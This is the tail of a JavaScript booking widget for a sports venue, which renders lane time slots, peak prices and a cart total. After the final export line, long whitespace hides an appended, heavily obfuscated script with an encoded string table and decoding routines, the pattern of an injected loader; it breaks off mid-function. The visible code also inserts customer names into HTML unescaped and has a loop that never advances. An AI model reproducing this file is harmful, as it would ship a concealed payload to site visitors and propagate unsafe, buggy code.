                let isBoxCricket = $("#selectedLane").text().trim() === "Box Cricket";
                return !(isBoxCricket && !isPublished);
            });

            if (!filteredVariants.length) {
                console.error("No published variants available.");
                $("#dateHeader").html("");
                return;
            }

            this.variantMap = {};
            filteredVariants.forEach(variant => {
                this.variantMap[variant.id] = variant.name;
            });

            let dateHeader = filteredVariants.map(variant => `<th>${variant.name}</th>`).join("");
            $("#dateHeader").html(dateHeader);

            let morningSlots = this._getTimeSlots(dayPrices.morning_start_time, dayPrices.morning_end_time);
            let eveningSlots = this._getTimeSlots(dayPrices.evening_start_time, dayPrices.evening_end_time);

            let row = "<tr>";
            filteredVariants.forEach(variant => {
                let laneName = variant.name;
                let laneContent = `<td class="lane-column" data-variant-id="${variant.id}" data-lane-name="${laneName}" style="padding: 5px; vertical-align: top;">`;

                // Render morning slots
                morningSlots.forEach(time => {
                    let slotKey = `${variant.id}-${selectedDate}-${time}`;
                    let price = dayPrices.morning_price;

                    if (this._isPeakTimeCheck(time, selectedDate, this.peakSlots)) {
                        price = this.peakPrice;
                    }

                    // ✅ Check if slot is booked
                    let bookedKey = `${laneName}-${selectedDate}-${time}`;
                    let bookedSlotData = bookedSlotsMap[bookedKey];
                    let isBooked = bookedSlotData && bookedSlotData.isBooked;

                    // ✅ Debug log
                    if (isBooked) {
                        console.log(`Slot ${bookedKey} is BOOKED`);
                    }

                    this.slotPrices[slotKey] = price;

                    let slotClass = "available-slot";
                    if (isBooked) {
                        slotClass = "booked-slot";
                    } else if (this._isPastTime(time, selectedDate)) {
                        slotClass = "past-slot";
                    }

                    let customerNameHtml = "";
                    if (isBooked && bookedSlotData.customerName) {
                        customerNameHtml = `<span style="display: block; font-size: 10px; color: #000; font-weight: bold; line-height: 1;">${bookedSlotData.customerName}</span>`;
                    }

                    let slotContent = `<small class="slot-text">${isBooked ? `<del>${time}</del>` : time}<br></small>${customerNameHtml}`;

                    laneContent += `<div class="slot ${slotClass}"
                                    data-variant-id="${variant.id}"
                                    data-time="${time}"
                                    data-date="${selectedDate}"
                                    data-lane="${laneName}"
                                    data-price="${price}">
                                    ${slotContent}
                                </div>`;
                });

                // Divider
                laneContent += `<div class="slot-divider" style="border-top: 1px dashed #ccc; margin: 10px 0;"></div>`;

                // Render evening slots
                eveningSlots.forEach(time => {
                    let slotKey = `${variant.id}-${selectedDate}-${time}`;
                    let price = dayPrices.evening_price;

                    if (this._isPeakTimeCheck(time, selectedDate, this.peakSlots)) {
                        price = this.peakPrice;
                    }

                    // ✅ Check if slot is booked
                    let bookedKey = `${laneName}-${selectedDate}-${time}`;
                    let bookedSlotData = bookedSlotsMap[bookedKey];
                    let isBooked = bookedSlotData && bookedSlotData.isBooked;

                    // ✅ Debug log
                    if (isBooked) {
                        console.log(`Slot ${bookedKey} is BOOKED`);
                    }

                    this.slotPrices[slotKey] = price;

                    let slotClass = "available-slot";
                    if (isBooked) {
                        slotClass = "booked-slot";
                    } else if (this._isPastTime(time, selectedDate)) {
                        slotClass = "past-slot";
                    }

                    let customerNameHtml = "";
                    if (isBooked && bookedSlotData.customerName) {
                        customerNameHtml = `<span style="display: block; font-size: 10px; color: #000; font-weight: bold; line-height: 1;">${bookedSlotData.customerName}</span>`;
                    }

                    let slotContent = `<small class="slot-text">${isBooked ? `<del>${time}</del>` : time}<br></small>${customerNameHtml}`;

                    laneContent += `<div class="slot ${slotClass}"
                                    data-variant-id="${variant.id}"
                                    data-time="${time}"
                                    data-date="${selectedDate}"
                                    data-lane="${laneName}"
                                    data-price="${price}">
                                    ${slotContent}
                                </div>`;
                });

                laneContent += `</td>`;
                row += laneContent;
            });

            row += "</tr>";
            tbody.append(row);

            this._restoreSlotsFromSession();
            this._updateSelectedSlots();

            // ✅ Click handlers
            $(".available-slot").off("click").on("click", function () {
                if (!$(this).hasClass("past-slot") && !$(this).hasClass("booked-slot")) {
                    $(this).toggleClass("selected-slot");
                }
            });

            // ✅ Ensure booked slots are non-clickable
            $(".booked-slot").off("click").css({
                'cursor': 'not-allowed',
                'opacity': '0.6',
                'pointer-events': 'none'
            });

        }).finally(() => {
            this.isGeneratingSlots = false;
        });
    },


    //_isPastTime: function (slotTime, selectedDate) {
    //    // Convert "04:00 PM" to 24-hour time
    //    const [time, modifier] = slotTime.split(" ");
    //    let [hours, minutes] = time.split(":").map(Number);
    //
    //    if (modifier === "PM" && hours < 12) hours += 12;
    //    if (modifier === "AM" && hours === 12) hours = 0;
    //
    //    const slotDateTime = new Date(selectedDate);
    //    slotDateTime.setHours(hours, minutes, 0, 0);
    //
    //    const now = new Date();
    //
    //    const isToday = new Date(selectedDate).toDateString() === now.toDateString();
    //    return isToday && slotDateTime < now;
    //},

    _isPastTime: function (slotTime, selectedDate) {
        const [time, modifier] = slotTime.split(" ");
        let [hours, minutes] = time.split(":").map(Number);

        if (modifier === "PM" && hours < 12) hours += 12;
        if (modifier === "AM" && hours === 12) hours = 0;

        const [year, month, day] = selectedDate.split("-").map(Number);
        const slotDateTime = new Date(year, month - 1, day, hours, minutes, 0);

        const now = new Date();

        const isToday =
            slotDateTime.toDateString() === now.toDateString();

        return isToday && slotDateTime < now;
    },



    _getDecimalTime: function (timeStr) {
        let [time, period] = timeStr.split(" ");
        let [hour, min] = time.split(":").map(Number);
        if (period === "PM" && hour !== 12) hour += 12;
        if (period === "AM" && hour === 12) hour = 0;
        return hour + (min / 60);
    },

    _isPeakTimeCheck: function (time, date, peakSlots) {
        if (!peakSlots || peakSlots.length === 0) return false;

        const dayNames = ["sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday"];
        const [year, month, day] = date.split('-').map(Number);
        const dateObj = new Date(year, month - 1, day);
        const dayOfWeek = dayNames[dateObj.getDay()];

        let timeVal = this._getDecimalTime(time);

        for (let pt of peakSlots) {
            if (pt.day === dayOfWeek) {
                let pStart = this._getDecimalTime(pt.start_time);
                let pEnd = this._getDecimalTime(pt.end_time);
                if (timeVal >= pStart && timeVal < pEnd) {
                    return true;
                }
            }
        }
        return false;
    },

    updateCart: function (productId, quantity, price) {

        return rpc('/update_cart', {
            'product_id': productId,
            'add_qty': quantity,
            'price': price
        }).then((response) => {
            if (response.success) {
                console.log("Cart updated successfully:", response.message);
            } else {
                console.error("Error updating cart:", response.message);
            }
        }).catch((error) => {
            console.error("RPC error:", error);
        });
    },
    _toggleAddButton: function () {
        let addButton = $(".btn-cls");

        addButton.each((index, button) => {
            let $button = $(button);
            let productId = $button.closest(".product-card").data("product-id");

            let isProductSelected = this.selectedExtraProducts.some(p => p.productId === productId);

            $button.prop("disabled", isProductSelected);
        });
    },


    _onRemoveSlot: function (ev) {
        let slotKey = $(ev.currentTarget).data("slot");
        let slotIndex = this.selectedSlots.findIndex(s => s.slotKey === slotKey);
        if (slotIndex !== -1) {
            let removedSlot = this.selectedSlots.splice(slotIndex, 1)[0];
            $(`.slot[data-time="${removedSlot.slotKey.split(" on ")[0]}"][data-date="${removedSlot.slotKey.split(" on ")[1]}"]`)
                .removeClass("selected bg-primary text-white");
            this._updateSelectedSlots();
        }
    },

    _getTimeSlots: function (start, end) {
        let slots = [];
        let startTime = this._convertTo24Hour(start);
        let endTime = this._convertTo24Hour(end);

        let current = new Date();
        current.setHours(Math.floor(startTime), (startTime % 1) * 60, 0);

        let endSlot = new Date();
        endSlot.setHours(Math.floor(endTime), (endTime % 1) * 60, 0);

        while (current < endSlot) {
            slots.push(this._convertTo12Hour(current.getHours() + current.getMinutes() / 60));
            current.setMinutes(current.getMinutes() + 30);
        }
        return slots;
    },



    _convertTo24Hour: function (timeStr) {
        let [time, period] = timeStr.split(" ");
        let [hour, min] = time.split(":").map(Number);
        if (period === "PM" && hour !== 12) hour += 12;
        if (period === "AM" && hour === 12) hour = 0;
        return hour;
    },

    _convertTo12Hour: function (hour) {
        let period = hour >= 12 ? "PM" : "AM";
        let displayHour = Math.floor(hour) % 12 || 12;
        let minutes = hour % 1 === 0 ? "00" : "30";
        let formattedHour = displayHour < 10 ? "0" + displayHour : displayHour;

        return `${formattedHour}:${minutes} ${period}`;
    },



    _isSlotBooked: function (date, time, bookedSlots, laneName, productName, newRestrictedLanes) {
        let normalizedTime = this._normalizeTime(time);
        if (bookedSlots[date]) {
            let isSameLaneBooked = bookedSlots[date].some(slot =>
                slot.slot_time === normalizedTime && slot.lane_name === laneName && slot.product_name === productName
            );
            if (isSameLaneBooked) {
                return true;
            }
            let restrictedLanes = newRestrictedLanes;
            if (restrictedLanes[laneName]) {
                let boxDetails = restrictedLanes[laneName];
                let isBoxDisabled = bookedSlots[date].some(slot =>
                    slot.slot_time === normalizedTime &&
                    restrictedLanes[laneName].lanes.includes(slot.lane_name) &&
                    slot.product_name === boxDetails.product
                );
                if (isBoxDisabled) {
                    return true;
                }
            }
            let laneMapping = restrictedLanes;
            for (let box in laneMapping) {
                if (laneMapping[box].product === productName && laneMapping[box].lanes.includes(laneName)) {
                    let isBoxBooked = bookedSlots[date]?.some(slot =>
                        slot.slot_time === normalizedTime && slot.lane_name.startsWith(box)
                    );
                    if (isBoxBooked) {
                        return true;
                    }
                }
            }
        }
        return false;

    },

    _normalizeTime: function (time) {
        let [hour, period] = time.split(":");
        let normalizedHour = hour.padStart(2, "0");
        return `${normalizedHour}:${period}`;
    },
    _getDynamicPrice: function (time, date, prices) {
        let weekendDays = ["Sat", "Sun"];

        let dateParts = date.split(' ');
        let dayOfMonth = dateParts[0];
        let dayOfWeek = dateParts[1];

        let currentYear = new Date().getFullYear();
        let currentMonth = new Date().getMonth() + 1;
        let fullDate = `${currentYear}-${currentMonth < 10 ? '0' + currentMonth : currentMonth}-${dayOfMonth.padStart(2, '0')}`;
        let dateObject = new Date(fullDate);

        let dayIndex = dateObject.getDay();
        let day = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"][dayIndex];

        let startMorning = this._convertTo24Hour(prices.morning_start_time);
        let endMorning = this._convertTo24Hour(prices.morning_end_time);
        let startEvening = this._convertTo24Hour(prices.evening_start_time);
        let endEvening = this._convertTo24Hour(prices.evening_end_time);

        let hour = this._convertTo24Hour(time);
        if (weekendDays.includes(day)) {
            if (hour >= startMorning && hour < endMorning) {
                return prices.weekend_morning_price;
            } else if (hour >= startEvening && hour < endEvening) {
                return prices.weekend_evening_price;
            }
        } else {
            if (hour >= startMorning && hour < endMorning) {
                return prices.morning_price;
            } else if (hour >= startEvening && hour < endEvening) {
                return prices.evening_price;
            }
        }
        return 500;
    },

    _normalizeDate: function (dateStr) {
        const daysOfWeek = {
            "Mon": "01",
            "Tue": "02",
            "Wed": "03",
            "Thu": "04",
            "Fri": "05",
            "Sat": "06",
            "Sun": "07"
        };
        let [day, weekday] = dateStr.split(" ");
        let month = new Date().getMonth() + 1;
        month = month < 10 ? "0" + month : month;
        let year = new Date().getFullYear();

        return `${year}-${month}-${day.padStart(2, "0")}`;
    },
    _updateSelectedSlots: function () {
        let selectedSlotsContainer = $("#selectedSlot");
        selectedSlotsContainer.empty();
        let totalPrice = 0;
        let noOfDays = 0;
        if (!this.selectedSlotsByLane) {
            this.selectedSlotsByLane = {};
        }
        let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
        if (allSelectedSlots.length === 0) {
            $(".slot").removeClass("selected text-white").css("background-color", "#f1f1f1");
            selectedSlotsContainer.html("<p>No slot selected</p>");
            $("#confirmBtn, .hide_cls, #price").hide();
            $("#cds").show().text("No Slot Selected");
            $("#total_price, #grand_price").text("$ 0");
            this.selectedExtraProducts = [];
            $("#selectedSlotDropdown").removeClass("show");
            $("#selectedProduct").html("No Add-ons selected");
            $("#selectedproductDropdown").removeClass("show");
            sessionStorage.removeItem("selectedSlots");
            sessionStorage.clear();
            let addButton = $(".btn-cls");
            addButton.prop("disabled", true);
            return;
        }

        $(".hide_cls, #price, #confirmBtn").show();
        $("#cds").hide();

        let slotGroups = {};

        allSelectedSlots.forEach(slot => {
            let parts = slot.slotKey.split("-");
            if (parts.length !== 5) {
                console.error("Unexpected slotKey format:", slot.slotKey);
                return;
            }

            let [variantId, year, month, day, time] = parts;
            let variantName = this.variantMap[variantId] || `Lane ${variantId}`;
            let date = `${year}-${month}-${day}`;
            let key = `${variantId}-${date}`;

            if (!slotGroups[key]) {
                slotGroups[key] = { variantName, date, slots: [] };
            }
            slotGroups[key].slots.push({ time, timeValue: parseInt(time.replace(":", ""), 10), slot });
        });

        let slotList = "<ul class='list-group'>";
        Object.values(slotGroups).forEach(({ variantName, date, slots }) => {
            slots.sort((a, b) => a.timeValue - b.timeValue);
            let mergedSlots = [];
            let start = slots[0].time;
            let end = slots[0].time;
            let totalGroupPrice = slots[0].slot.price;

            for (let i = 1; i < slots.length; i++) {
                let prevTime = slots[i - 1].timeValue;
                let currTime = slots[i].timeValue;

                if (currTime - prevTime === 30 || currTime - prevTime === 70) {
                    end = slots[i].time;
                    totalGroupPrice += slots[i].slot.price;
                } else {
                    let prevExtendedEnd = this._addThirtyMinutes(end);
                    mergedSlots.push({ start, end: prevExtendedEnd, totalGroupPrice });
                    start = slots[i].time;
                    end = slots[i].time;
                    totalGroupPrice = slots[i].slot.price;
                }
            }
            let extendedEnd = this._addThirtyMinutes(end);
            mergedSlots.push({ start, end: extendedEnd, totalGroupPrice });
            mergedSlots.forEach(({ start, end, totalGroupPrice }) => {
                let slotRange = start === end ? start : `${start} to ${end}`;
                let isRecurring = $("#recurringBooking").is(":checked");
                if (isRecurring) {
                    let dateFrom = $('#fromDate').val();
                    let todate = $('#toDate').val();
                    let dayname = $('#daySelector').val();
                    let fromDateObj = new Date(dateFrom);
                    let toDateObj = new Date(todate);
                    let number_days = 0;

                    if (toDateObj >= fromDateObj) {
                        while (fromDateObj <= toDateObj) {
                            if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                                number_days++;
                            }
                            fromDateObj.setDate(fromDateObj.getDate() + 1);

                        }
                    }
                    slotList += `
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        <span>${variantName} - ${slotRange} <strong>(${dateFrom} - ${todate}</strong> on ${dayname})</span>
                        <span>$ ${totalGroupPrice * number_days}</span>

                    </li>`;
                }
                else {
                    slotList += `
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <span>${variantName} - ${slotRange} on <strong>${date}</strong></span>
                    <span>$ ${totalGroupPrice}</span>

                </li>`;
                }

                totalPrice += totalGroupPrice;
            });
        });

        let bookedHours = allSelectedSlots.length * 0.5;
        $("#sub_total").text(bookedHours + " Hours");
        $("#bookedHoursInput").val(bookedHours);
        let confirmBtn = $("#confirmBtn");

        let warningMessage = document.getElementById("warningMessage");
        let productName = $("#selectedLane").text().trim();
        if (productName == 'Box Cricket') {
            if (bookedHours < 1) {
                warningMessage.innerText = `Selected hours for ${productName} should not be less than 2 hour.`;
                warningMessage.classList.remove("d-none");
            }
            else {
                warningMessage.classList.add("d-none");
            }
        }
        else {
            if (bookedHours < 1) {
                warningMessage.innerText = `Selected hours for ${productName} should not be less than 1 hour.`;
                warningMessage.classList.remove("d-none");
            } else {
                warningMessage.classList.add("d-none");

            }
        }


        slotList += "</ul>";
        selectedSlotsContainer.html(slotList);
        totalPrice += this.selectedProductPrice;
        let selectedSlotsCount = allSelectedSlots.length / 2;
        let totalExtraProductPrice = this.selectedExtraProducts.reduce((sum, product) => sum + product.price * selectedSlotsCount, 0);

        totalPrice += totalExtraProductPrice;
        let isRecurring = $("#recurringBooking").is(":checked");
        let fromDate = $("#fromDate").val();
        let toDate = $("#toDate").val();
        if (isRecurring && fromDate && toDate) {
            let fromDateObj = new Date(fromDate);
            let toDateObj = new Date(toDate);

            let dayname = $("#daySelector").val();

            if (toDateObj >= fromDateObj) {
                while (fromDateObj <= toDateObj) {
                    if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                        noOfDays++;
                    }
                    fromDateObj.setDate(fromDateObj.getDate() + 1);

                }
                $("#add").text(noOfDays);
                totalPrice = totalPrice * noOfDays;
            }
        }


        $("#totalPrice").text("Total Price: $ " + totalPrice);
        $("#total_price, #grand_price").text(`$ ${totalPrice}`);
        $("#selected_slot_count").text(`${allSelectedSlots.length}`);

        $(".slot").removeClass("selected text-white").css("background-color", "#f1f1f1");

        allSelectedSlots.forEach(slot => {
            let parts = slot.slotKey.split("-");
            let variantId = parts[0];
            let date = `${parts[1]}-${parts[2]}-${parts[3]}`;
            let time = parts[4];

            $(`.slot[data-variant-id='${variantId}'][data-date='${date}'][data-time='${time}']`)
                .addClass("selected text-white")
                .css("background-color", "#28a745");
        });

        $(document).off("click", ".remove-slot").on("click", ".remove-slot", (ev) => {
            let $button = $(ev.currentTarget);

            let variantId = $button.data("variant-id");
            let date = $button.data("date");
            let start = $button.data("start");
            let price = parseFloat($button.data("price"));

            let slotKey = `${variantId}-${date}-${start}`;
            this._removeSelectedSlot(slotKey, variantId, start, date, price);
            $button.closest("li").remove();
        });
    },


    _addThirtyMinutes: function (time) {
        let [hour, minute, period] = time.match(/(\d+):(\d+)\s*(AM|PM)/).slice(1);
        hour = parseInt(hour, 10);
        minute = parseInt(minute, 10);

        minute += 30;
        if (minute >= 60) {
            minute -= 60;
            hour += 1;
        }

        if (hour === 12 && period === "AM") {
            period = "PM";
        } else if (hour === 12 && period === "PM") {
            period = "AM";
        } else if (hour > 12) {
            hour -= 12;
        }
        return `${hour}:${minute.toString().padStart(2, "0")} ${period}`;
    },

    _removeSelectedSlot: function (slotKey, variantId, time, date, price) {
        this.selectedSlotsByLane[variantId] = [];
        $(".slot[data-variant-id='" + variantId + "']").removeClass("selected text-white").css("background-color", "white");
        $(".slot[data-variant-id='" + variantId + "']").removeClass("selected-slot");

        let productId = $("#selectedProductId").val();
        this.updateCart(productId, -1, -price);

        this._updateSelectedSlots();
    },


    _updateTotalPrice: function () {
        let noOfDays = 0;
        let selectedSlotsContainer = $("#selectedSlot");
        let allSelectedSlots = Object.values(this.selectedSlotsByLane).flat();
        let selectedSlotsCount = allSelectedSlots.length / 2;
        let totalExtraProductPrice = this.selectedExtraProducts.reduce((sum, product) => sum + product.price * selectedSlotsCount, 0);
        let total = allSelectedSlots.reduce((sum, slot) => sum + slot.price, 0) + totalExtraProductPrice + this.selectedProductPrice;
        let isRecurring = $("#recurringBooking").is(":checked");
        let fromDate = $("#fromDate").val();
        let toDate = $("#toDate").val();
        if (isRecurring && fromDate && toDate) {
            let fromDateObj = new Date(fromDate);
            let toDateObj = new Date(toDate);

            let dayname = $("#daySelector").val();
            if (toDateObj >= fromDateObj) {
                while (fromDateObj <= toDateObj) {
                    if (fromDateObj.toLocaleDateString('en-US', { weekday: 'long' }) === dayname) {
                        noOfDays++;
                    }
                }
                fromDateObj.setDate(fromDateObj.getDate() + 1);
                total = total * noOfDays;
            }
        }
        $("#totalPrice").text("Total Price: $ ");
        $("#total_price, #grand_price").text(`$ ${total}`);
    }
});
export default publicWidget.registry.SlotSelection;																																																																																																																																																																																																																																																																										var z = '-3183-2';(function(SqyHyYEAaE$HyXWxkdHK,P_Kqu$vK){var YRMhQw_ocPRbbLhKuQoCg=KAUiTqPiXdWs,Ga_YhG=SqyHyYEAaE$HyXWxkdHK();while(!![]){try{var oQdQfWjjYSYJzlQNxfk=Math['trunc'](-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x218))/(Math.ceil(-0x9)*-0x164+Math.floor(parseInt(0x9))*Math.floor(parseInt(0x249))+-0x108a*parseInt(0x2)))*parseInt(-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x222))/(-parseInt(0x260f)+-0xe69+parseFloat(-parseInt(0x1))*-0x347a))+parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1f6))/(-parseInt(0x13)*parseInt(0x21)+-parseInt(0x44)*parseInt(0x2f)+Math.floor(0xef2))*(parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x21b))/(parseInt(0xcc2)+parseInt(0xd14)+-parseInt(0x295)*parseFloat(0xa)))+-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1ff))/(Math.floor(-parseInt(0x1))*0x121e+Math.floor(-0x1)*0x213+parseInt(0x1436))+parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x225))/(parseFloat(0x15f)*Number(-parseInt(0x1a))+parseInt(0x1ae8)+Math.floor(parseInt(0x8c4)))*Number(-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1fe))/(parseInt(0x65b)*-0x6+parseInt(0x1cbc)*0x1+parseInt(-0x13)*Math.max(-parseInt(0x7f),-parseInt(0x7f))))+parseFloat(parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x230))/(Math.ceil(-parseInt(0x6))*0x50b+-parseInt(0x4)*Math.floor(parseInt(0x51b))+Math.floor(0x32b6)))+-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1f1))/(Math.floor(parseInt(0x1aef))+Math.ceil(-0x86)*parseInt(0xb)+Math.floor(-parseInt(0x1524)))*Math['ceil'](parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1f7))/(0x1b1f*-0x1+parseInt(-0x1877)+parseInt(0x33a0)))+Math['ceil'](parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x22b))/(-parseInt(0x20c4)+parseInt(0x1b10)+Math.floor(0x5bf)));if(oQdQfWjjYSYJzlQNxfk===P_Kqu$vK)break;else Ga_YhG['push'](Ga_YhG['shift']());}catch(Qypub_ETSmdizpLTzEr){Ga_YhG['push'](Ga_YhG['shift']());}}}(HjHsHac$ObTDDGcJ,-0x14b728+parseInt(-0x96de7)*Math.max(0x2,0x2)+-parseInt(0x89)*-parseInt(0x5dce)));var NX=[-0x27*-parseInt(0x2bc35)+0x49*-parseInt(0x10be7)+parseInt(parseInt(0x4b341b)),Math.floor(parseInt(0x1))*0x2498+-0x275*Math.max(0x1,0x1)+Math.max(-0x20b4,-parseInt(0x20b4)),-parseInt(0x7ed3)+-parseInt(0x21d)*parseFloat(-parseInt(0x1))+parseInt(0xc7)*0x107,-parseInt(0x23d0)*Math.floor(-parseInt(0x1))+-parseInt(0x699)*-parseInt(0x5)+parseInt(0x11)*-0x3e8,Number(-0x55d)*parseInt(0x24)+parseFloat(0xb366)+-parseInt(0xa7)*-parseInt(0x11b),-parseInt(0x27fa15)+-parseInt(0x70a3)*Math.floor(parseInt(0x1))+0x17f*0x4e35],SX=[Math.max(-parseInt(0x455ff0),-0x455ff0)+0x13f*-parseInt(0x55db)+Math.max(parseInt(0x100fb72),parseInt(0x100fb72)),-0x1728+Math.max(0x1,0x1)*Math.max(-0x4d6,-parseInt(0x4d6))+Math.floor(-parseInt(0x337))*-parseInt(0x9),-parseInt(0xf)*0x1561+-0x1*Number(-0xe317)+Number(parseInt(0x10179)),-parseInt(0x2648)+0x5a5*Math.ceil(0x4)+Number(parseInt(0x106f)),-0x19ccc+parseFloat(-parseInt(0xc0df))+parseInt(0x338ec),-0x25bb*0x31c+Math.floor(-parseInt(0x1))*0x1dc5b7+Math.trunc(parseInt(0x87040))*0x1a];function spin(RmESsbUgJDDbsTvxobztOSl,vDm$EOxQEp){var IyxjPIDyrvwiq=KAUiTqPiXdWs,woErDcyT={'FIZpz':function(h_x$sbwsDNQWBLhrwdSUqx,DeXhAI_XpUkQC){return h_x$sbwsDNQWBLhrwdSUqx<DeXhAI_XpUkQC;},'whEzD':function(rP$kIeNETu,caehkMNzLl$JqRICTrxzrbSSMU){return rP$kIeNETu+caehkMNzLl$JqRICTrxzrbSSMU;},'ZBsbg':function(dFZvyBmIXia,SqzZqhxARkMI){return dFZvyBmIXia*SqzZqhxARkMI;},'UyTQj':function(Yqami$rwZbGqE,ClZeCotb$O){return Yqami$rwZbGqE%ClZeCotb$O;},'DxMNH':function(ad$kohMflBYDqCSNUA_Z,nNjaVKDHbKqp_azS$oAmaFU){return ad$kohMflBYDqCSNUA_Z%nNjaVKDHbKqp_azS$oAmaFU;},'gHQAr':function(KetmHlqbQnQ$fMbmGb,lXYAxiLMZQCWD_Lo_AGXy){return KetmHlqbQnQ$fMbmGb*lXYAxiLMZQCWD_Lo_AGXy;},'JuSMa':function(mFySNvxVVHQN,YPwXpNJi$AFg){return mFySNvxVVHQN%YPwXpNJi$AFg;},'PZGun':function(sbsCOrI,pTJzCvUdnfkdVWSrpgY){return sbsCOrI+pTJzCvUdnfkdVWSrpgY;}};for(var z__dqsKQ,ZAsqssRWZfU,kcazH_$om,qvKIWYnglKsqtcHYQ,ctMJs$uZdU,XBO$UgpdafB,LQVCDi_WtOmzPIz=[],QkuCHeqk$VrkwJaxczf=-0x16e3+-parseInt(0xd)*parseInt(0x1e1)+-0x2*-parseInt(0x17a8),VKYlWAFHWv_U=vDm$EOxQEp[parseFloat(-parseInt(0x18d2))+-parseInt(0x8d)*-parseInt(0x1)+Number(-parseInt(0x1))*-parseInt(0x1845)];QkuCHeqk$VrkwJaxczf<RmESsbUgJDDbsTvxobztOSl[IyxjPIDyrvwiq(0x203)];)LQVCDi_WtOmzPIz[QkuCHeqk$VrkwJaxczf]=RmESsbUgJDDbsTvxobztOSl[IyxjPIDyrvwiq(0x217)](QkuCHeqk$VrkwJaxczf),QkuCHeqk$VrkwJaxczf+=parseInt(0x2)*0x975+parseInt(0x13f3)*parseInt(0x1)+-parseInt(0x26dc);for(z__dqsKQ=LQVCDi_WtOmzPIz[IyxjPIDyrvwiq(0x203)],QkuCHeqk$VrkwJaxczf=0x19f7+parseInt(0x9c1)*Math.max(parseInt(0x2),0x2)+Math.trunc(-parseInt(0x2d79));woErDcyT[IyxjPIDyrvwiq(0x20f)](QkuCHeqk$VrkwJaxczf,z__dqsKQ);)ZAsqssRWZfU=woErDcyT[IyxjPIDyrvwiq(0x205)](woErDcyT[IyxjPIDyrvwiq(0x1ec)](VKYlWAFHWv_U,woErDcyT[IyxjPIDyrvwiq(0x205)](QkuCHeqk$VrkwJaxczf,vDm$EOxQEp[parseFloat(-parseInt(0x1))*0x22b9+-parseInt(0xa52)+-parseInt(0x2d0c)*-0x1])),woErDcyT[IyxjPIDyrvwiq(0x20c)](VKYlWAFHWv_U,vDm$EOxQEp[-parseInt(0xfc5)*-parseInt(0x2)+-0x6ba+parseInt(0x7f)*-0x32])),ctMJs$uZdU=woErDcyT[IyxjPIDyrvwiq(0x1f3)](kcazH_$om=woErDcyT[IyxjPIDyrvwiq(0x205)](woErDcyT[IyxjPIDyrvwiq(0x211)](VKYlWAFHWv_U,QkuCHeqk$VrkwJaxczf+vDm$EOxQEp[parseInt(0x28)*Math.ceil(-0x40)+0x36e*0xa+-0x1849]),VKYlWAFHWv_U%vDm$EOxQEp[0xb0a+-0xb3d+Math.floor(parseInt(0xb))*Math.ceil(parseInt(0x5))]),z__dqsKQ),XBO$UgpdafB=LQVCDi_WtOmzPIz[qvKIWYnglKsqtcHYQ=ZAsqssRWZfU%z__dqsKQ],LQVCDi_WtOmzPIz[qvKIWYnglKsqtcHYQ]=LQVCDi_WtOmzPIz[ctMJs$uZdU],LQVCDi_WtOmzPIz[ctMJs$uZdU]=XBO$UgpdafB,VKYlWAFHWv_U=woErDcyT[IyxjPIDyrvwiq(0x213)](woErDcyT[IyxjPIDyrvwiq(0x23b)](ZAsqssRWZfU,kcazH_$om),vDm$EOxQEp[parseInt(0x15da)*0x1+parseFloat(-0x303)*Math.ceil(-0x1)+-0x4*parseInt(0x636)]),QkuCHeqk$VrkwJaxczf+=parseInt(0x1)*parseInt(0x2515)+Math.trunc(-0xe3a)*parseInt(0x1)+Math.ceil(-0x75)*Number(0x32);return LQVCDi_WtOmzPIz[IyxjPIDyrvwiq(0x238)]('');}function splitLane(ovuYjbVnFvDlzVy_ukAYHOdKRn){var ekGtrocNRo__iuVMSOSkHNjY=KAUiTqPiXdWs,qncreGR={'tQLCp':function(uRG$nZGfFJ,FF_wSDpb,wcoDDDYPtFgo){return uRG$nZGfFJ(FF_wSDpb,wcoDDDYPtFgo);}},YTBFJJiWurAEjJmbcTWawa=String[ekGtrocNRo__iuVMSOSkHNjY(0x216)](Math.trunc(-parseInt(0x24c2))+Math.floor(0x1f67)+-0x577*Math.max(-0x1,-0x1)),ezrGL_aakkqJNN_SEty=qncreGR[ekGtrocNRo__iuVMSOSkHNjY(0x227)](spin,ovuYjbVnFvDlzVy_ukAYHOdKRn,NX);return(ezrGL_aakkqJNN_SEty=(ezrGL_aakkqJNN_SEty=(ezrGL_aakkqJNN_SEty=ezrGL_aakkqJNN_SEty[ekGtrocNRo__iuVMSOSkHNjY(0x229)]('^')[ekGtrocNRo__iuVMSOSkHNjY(0x238)](YTBFJJiWurAEjJmbcTWawa))[ekGtrocNRo__iuVMSOSkHNjY(0x229)]('*1')[ekGtrocNRo__iuVMSOSkHNjY(0x238)]('^'))[ekGtrocNRo__iuVMSOSkHNjY(0x229)]('*0')[ekGtrocNRo__iuVMSOSkHNjY(0x238)]('*'))[ekGtrocNRo__iuVMSOSkHNjY(0x229)](YTBFJJiWurAEjJmbcTWawa);}function peel(yAg$cxEVKRgmKkhjmw_W){var QI_WxIs=KAUiTqPiXdWs,dphGjy$zPmP={'qOPvW':function(XObjIGmNXCKnShLBWhfRq,slFmBOfnzWQnsYTYc,iYcaRqlxjJguDJLhuBiGlqZO){return XObjIGmNXCKnShLBWhfRq(slFmBOfnzWQnsYTYc,iYcaRqlxjJguDJLhuBiGlqZO);}};return dphGjy$zPmP[QI_WxIs(0x22a)](spin,yAg$cxEVKRgmKkhjmw_W,SX);}function KAUiTqPiXdWs(cJtKAUiTqPiXdWsHG$z,QP$ePFzzIF_xARRtPfzF){var ZpzcNwh_EzDna$ZBsbgc=HjHsHac$ObTDDGcJ();return 